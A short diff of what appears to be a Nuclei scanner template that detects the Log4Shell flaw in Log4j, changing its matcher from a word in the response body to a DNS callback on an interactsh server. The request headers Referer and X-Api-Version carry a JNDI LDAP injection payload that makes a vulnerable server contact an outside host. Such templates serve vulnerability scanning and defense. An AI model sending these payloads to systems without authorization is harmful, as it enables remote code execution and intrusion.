@@ -16,11 +16,8 @@ requests:
     Referer: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
     X-Api-Version: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
 
-  matchers:
-  - type: word
-    part: body
-    words:
-      - "Omkar7505"
-
-
-     
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
